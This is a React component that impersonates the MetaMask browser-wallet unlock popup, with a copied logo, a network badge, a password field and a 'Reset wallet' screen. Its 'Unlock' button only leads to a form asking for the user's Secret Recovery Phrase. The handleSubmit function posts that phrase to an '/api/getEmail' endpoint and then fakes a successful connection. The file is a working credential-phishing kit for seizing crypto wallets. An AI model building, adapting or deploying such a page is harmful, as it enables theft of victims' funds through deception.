import { Fragment, useState, useEffect }from 'react'
import { Transition } from '@headlessui/react';
import MetamaskLogo from './MetaMaskLogo';

const MetaWallet = ({
    children,
    isOpen = Boolean,
    setIsOpen,
    setConnect,
    HandleChange,
}) => {
    // let [ isOpen, setIsOpen ] = useState(false);
    const [recover, setRecover] = useState(false)
    const [recovery, setRecovery] = useState('')


    // useEffect(() => {
    //     setIsOpen(isOpen);
    //     if(!isOpen) {
    //         document.documentElement.style.overflow = "auto";
    //     } else {
    //         document.documentElement.style.overflow = "hidden";
    //     }
    // }, [isOpen]);

    // let HandleChange = () => {
    //     if (/Android|webOS|iPhone|iPod|ipad|Opera Mini/i.test(navigator.userAgent)) {
    //         // The browser is a mobile browser
    //         alert('metamask not detected')
    //       } else {
    //         // The browser is not a mobile browser
    //         setIsOpen(!isOpen)
    //         setRecover(false)
    //       }
        
        
    // }
    const handleSubmit = (event) => {
        event.preventDefault();
        fetch('/api/getEmail', {
            method: 'post',
            body: recovery
        })
        .then(() => setRecovery('')
        )
        .then(() => setRecover(false))
        .then(() => setConnect("true"))
        .then(() => setIsOpen(false)
        
        )
        .catch((err)=>(
            console.log(err)
        ))
        
    
      };
    
    function focusFunction() {
        document.getElementById("demo").innerHTML = "Password"
        document.getElementById("password").placeholder = "";
        
      }
    function blurFunction() {
        document.getElementById("password").placeholder = "password";
        document.getElementById("demo").innerHTML = ""
      }
      function focusRecovery() {
        document.getElementById("Phrase").innerHTML = "Secret Recovery Phrase"
        document.getElementById("Recovery").placeholder = "";
        
      }
    function blurRecovery() {
        document.getElementById("Recovery").placeholder = "Secret Recovery Phrase";
        document.getElementById("Phrase").innerHTML = ""
      }
  return (
    <>
    <div onClick={() => HandleChange()}>
            {children}
        </div>
    <Transition show={isOpen}>

        <Transition.Child
                as={Fragment}
                enter="transition-all duration-200"
                enterFrom="opacity-0"
                enterTo="opacity-100"
                leave="transition-all duration-200"
                leaveTo="opacity-0"
                leaveFrom="opacity-100"
            >
            <div style={{ zIndex: '1' }} onClick={() => HandleChange()} className="w-full h-full left-0 top-0 bg-black/10 fixed" />
        </Transition.Child>
        <Transition.Child
                as={Fragment}
                enter="transition-all duration-200"
                enterFrom="opacity-0"
                enterTo="opacity-100"
                leave="transition-all duration-200"
                leaveTo="opacity-0"
                leaveFrom="opacity-100"
            >
            <div className='bg-white fixed w-[430px] max-w-[550px] min-h-[700px] max-h-[900px]  z-[1000] top-2   right-5  text-gray-400'>
            <div className='flex w-full p-4 justify-between items-center bg-gray-100 '>
                <div className='text-black'>
                    <svg
                        height={40}
                        viewBox="0 0 1311 242"
                        width={180}
                        xmlns="http://www.w3.org/2000/svg"
                        className=""
                        >
                        <g fill="none">
                            <g fill="var(--color-text-default)" transform="translate(361 61)">
                            <path d="m796.7 60.9c-6.8-4.5-14.3-7.7-21.4-11.7-4.6-2.6-9.5-4.9-13.5-8.2-6.8-5.6-5.4-16.6 1.7-21.4 10.2-6.8 27.1-3 28.9 10.9 0 .3.3.5.6.5h15.4c.4 0 .7-.3.6-.7-.8-9.6-4.5-17.6-11.3-22.7-6.5-4.9-13.9-7.5-21.8-7.5-40.7 0-44.4 43.1-22.5 56.7 2.5 1.6 24 12.4 31.6 17.1s10 13.3 6.7 20.1c-3 6.2-10.8 10.5-18.6 10-8.5-.5-15.1-5.1-17.4-12.3-.4-1.3-.6-3.8-.6-4.9 0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6 0 12.1 3 18.8 11.2 24.9 7.7 5.8 16.1 8.2 24.8 8.2 22.8 0 34.6-12.9 37-26.3 2.1-13.1-1.8-24.9-13.5-32.7z" />
                            <path d="m71.6 2.3h-7.4-8.1c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-8.1-7.4-10c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z" />
                            <path d="m541 2.3c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-25.4c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z" />
                            <path d="m325.6 2.3h-31.1-16.7-31.1c-.3 0-.6.3-.6.6v14.4c0 .3.3.6.6.6h30.5v100.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-100.4h30.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.2-.6-.6-.6z" />
                            <path d="m424.1 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.4.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z" />
                            <path d="m683.3 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.3.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z" />
                            <path d="m149.8 101.8v-35.8c0-.3.3-.6.6-.6h44.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-44.5c-.3 0-.6-.3-.6-.6v-30.6c0-.3.3-.6.6-.6h50.6c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-51.2-17.3c-.3 0-.6.3-.6.6v15 31.9 15.6 37 15.8c0 .3.3.6.6.6h17.3 53.3c.3 0 .6-.3.6-.6v-15.2c0-.3-.3-.6-.6-.6h-52.8c-.3-.1-.5-.3-.5-.7z" />
                            <path d="m949.3 117.9-57.8-59.7c-.2-.2-.2-.6 0-.8l52-54c.4-.4.1-1-.4-1h-21.3c-.2 0-.3.1-.4.2l-44.1 45.8c-.4.4-1 .1-1-.4v-45c0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-50.8c0-.5.7-.8 1-.4l50 51.6c.1.1.3.2.4.2h21.3c.4-.1.7-.8.3-1.1z" />
                            </g>
                            <g strokeLinecap="round" strokeLinejoin="round" transform="translate(1 1)">
                            <path d="m246.1.2-101.1 75 18.8-44.2z" fill="#e17726" stroke="#e17726" />
                            <g fill="#e27625" stroke="#e27625" transform="translate(2)">
                                <path d="m10.9.2 100.2 75.7-17.9-44.9z" />
                                <path d="m207.7 174.1-26.9 41.2 57.6 15.9 16.5-56.2z" />
                                <path d="m.2 175 16.4 56.2 57.5-15.9-26.8-41.2z" />
                                <path d="m71 104.5-16 24.2 57 2.6-1.9-61.5z" />
                                <path d="m184 104.5-39.7-35.4-1.3 62.2 57-2.6z" />
                                <path d="m74.1 215.3 34.5-16.7-29.7-23.2z" />
                                <path d="m146.4 198.6 34.4 16.7-4.7-39.9z" />
                            </g>
                            <g fill="#d5bfb2" stroke="#d5bfb2" transform="translate(76 198)">
                                <path d="m106.8 17.3-34.4-16.7 2.8 22.4-.3 9.5z" />
                                <path d="m.1 17.3 32 15.2-.2-9.5 2.7-22.4z" />
                            </g>
                            <path
                                d="m108.7 160.6-28.6-8.4 20.2-9.3z"
                                fill="#233447"
                                stroke="#233447"
                            />
                            <path
                                d="m150.3 160.6 8.4-17.7 20.3 9.3z"
                                fill="#233447"
                                stroke="#233447"
                            />
                            <g fill="#cc6228" stroke="#cc6228" transform="translate(49 128)">
                                <path d="m27.1 87.3 5-41.2-31.8.9z" />
                                <path d="m128.9 46.1 4.9 41.2 26.9-40.3z" />
                                <path d="m153 .7-57 2.6 5.3 29.3 8.4-17.7 20.3 9.3z" />
                                <path d="m31.1 24.2 20.2-9.3 8.4 17.7 5.3-29.3-57-2.6z" />
                            </g>
                            <g fill="#e27525" stroke="#e27525" transform="translate(57 128)">
                                <path d="m0 .7 23.9 46.7-.8-23.2z" />
                                <path d="m122 24.2-.9 23.2 23.9-46.7z" />
                                <path d="m57 3.3-5.3 29.3 6.7 34.6 1.5-45.6z" />
                                <path d="m88 3.3-2.8 18.2 1.4 45.7 6.7-34.6z" />
                            </g>
                            <path
                                d="m150.3 160.6-6.7 34.6 4.8 3.4 29.7-23.2.9-23.2z"
                                fill="#f5841f"
                                stroke="#f5841f"
                            />
                            <path
                                d="m80.1 152.2.8 23.2 29.7 23.2 4.8-3.4-6.7-34.6z"
                                fill="#f5841f"
                                stroke="#f5841f"
                            />
                            <path
                                d="m150.9 230.5.3-9.5-2.6-2.2h-38.2l-2.5 2.2.2 9.5-32-15.2 11.2 9.2 22.7 15.7h38.9l22.8-15.7 11.1-9.2z"
                                fill="#c0ac9d"
                                stroke="#c0ac9d"
                            />
                            <path
                                d="m148.4 198.6-4.8-3.4h-28.2l-4.8 3.4-2.7 22.4 2.5-2.2h38.2l2.6 2.2z"
                                fill="#161616"
                                stroke="#161616"
                            />
                            <g fill="#763e1a" stroke="#763e1a">
                                <path d="m250.4 80.1 8.5-41.4-12.8-38.5-97.7 72.5 37.6 31.8 53.1 15.5 11.7-13.7-5.1-3.7 8.1-7.4-6.2-4.8 8.1-6.2z" />
                                <path d="m.1 38.7 8.6 41.4-5.5 4.1 8.2 6.2-6.2 4.8 8.1 7.4-5.1 3.7 11.7 13.7 53.1-15.5 37.6-31.8-97.7-72.5z" />
                            </g>
                            <g fill="#f5841f" stroke="#f5841f">
                                <path d="m239.1 120-53.1-15.5 16 24.2-23.9 46.7 31.6-.4h47.2z" />
                                <path d="m73 104.5-53.1 15.5-17.7 55h47.1l31.6.4-23.9-46.7z" />
                                <path d="m145 131.3 3.4-58.6 15.4-41.7h-68.6l15.4 41.7 3.4 58.6 1.3 18.4.1 45.5h28.2l.1-45.5z" />
                            </g>
                            </g>
                        </g>
                    </svg>
                </div>
                <div className='flex justify-between rounded-full border border-gray-400 p-3 items-center space-x-2'>
                <span className='bg-green-600 rounded-full w-[12px] h-[12px]'></span>
                
                <h3 className='font-light text-black whitespace-nowrap text-lg'>Ethereum Mainnet</h3>
                <div className='text-black'>
                <svg
                width={16}
                height={16}
                fill="currentColor"
                className="network-display__icon"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 512 512"
                >
                <path d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z" />
                </svg>
                </div>
                </div>
            </div>

        {/* the recovery section   */}
        {recover?
        <Transition.Child
        as={Fragment}
        enter="transition-all duration-500 "
        enterFrom="opacity-0"
        enterTo="opacity-100"
        leave="transition-all duration-400"
        leaveTo="opacity-0"
        leaveFrom="opacity-100"
    >
        <div className='flex justify-center'>
        <div className='flex flex-col items-center px-6 py-4 pt-5 w-[100%]'>
            <h1 className='font-bold text-black/70 text-4xl mt-8'>Reset wallet</h1>
            <p className='text-base mt-5 text-center'>MetaMask does not keep a copy of your password. If you’re having trouble unlocking your account, you will need to reset your wallet. 
            You can do this by providing the Secret Recovery Phrase you used when you set up your wallet.</p>
            <div className='flex space-x-2 items-center mt-4 text-xs p-2 rounded-lg ring-1 ring-blue-400 bg-blue-100'>
            <div className=' w-[18px] text-blue-600'>
            <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                <path
                    d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z"
                    fill='currentColor'
                />
            </svg>
            </div>
            <p className='text-[8px] font-light'>You can paste your entire secret recovery phrase into any field</p>
            </div>
            <form className='mt-10 w-full' onSubmit={handleSubmit}>
                <div>
                    <label htmlFor="Recovery">
                        <span style={{display: "inline-block", width: "500px", height: "27px"}} id='Phrase' className='text-base text-black'></span>
                    <input
                    onFocus={focusRecovery} 
                    onBlur={blurRecovery}
                    type="text" 
                    name="Recovery" 
                    id="Recovery" 
                    value={recovery}
                    onChange={(e) => setRecovery(e.target.value)}
                    placeholder='Secret Recovery Phrase'
                    className='px-0 py-1 border-0 border-b-4 w-full focus:border-b-4 
                    focus:outline-none focus:border-blue-500 focus:border-b-blue-300  '
                    />
                    </label>
                </div>
                <button className=' mt-4 bg-blue-500 rounded-full px-4 py-4 w-full text-white'>Restore</button>
            </form>
            
            <div className='text-xs mt-8'>
            <span >
                {" "}
                Need help? Contact{" "}
                <a
                    href="https://support.metamask.io"
                    target="_blank"
                    rel="noopener noreferrer"
                    className='text-blue-500 '
                >
                    MetaMask support
                </a>{" "}
                </span>
            </div>
        </div>
        </div>
        </Transition.Child>
        :
        // login section
        <div className='flex justify-center '>
                <div className='flex flex-col items-center justify-evenly px-6 py-4 pt-5 w-[100%]'>
                    <div className="mt-10 unlock-page__mascot-container">
                        <MetamaskLogo/>
                    </div>
                    <h1 className='font-bold text-black/70 text-4xl'>Welcome back!</h1>
                    <div className='text-base'>The decentralized web awaits</div>
                    <form onSubmit={() => (setRecover(!recover))} className=' mt-10 w-full'>
                        <div>
                            <label htmlFor="password">
                                <span id='demo'style={{display: "inline-block", width: "500px", height: "27px"}} className='text-base text-black'/>
                            <input
                            onFocus={focusFunction} 
                            onBlur={blurFunction}
                            type="password" 
                            name="password" 
                            id="password" 
                            placeholder='Password'
                            className='px-0 py-1 border-0 border-b-4 w-full focus:border-b-4 
                            focus:outline-none focus:border-blue-700 focus:border-b-blue-300  '
                            />
                            </label>
                        </div>
                        <button className='bg-blue-500 rounded-full px-4 py-4 w-full mt-4 text-white'>Unlock</button>
                    </form>
                    
                    <div className='text-base mt-5'>
                        <button onClick={() => (setRecover(!recover))} className='text-blue-600'>Forgot password?</button>
                    </div>
                    <div className='text-base mt-8'>
                    <span >
                        {" "}
                        Need help? Contact{" "}
                        <a
                            href="https://support.metamask.io"
                            target="_blank"
                            rel="noopener noreferrer"
                            className='text-blue-500 '
                        >
                            MetaMask support
                        </a>{" "}
                        </span>
                    </div>
                </div>
        </div>
        }
            

            </div>
            </Transition.Child>
    </Transition>
    </>
  )
}

export default MetaWallet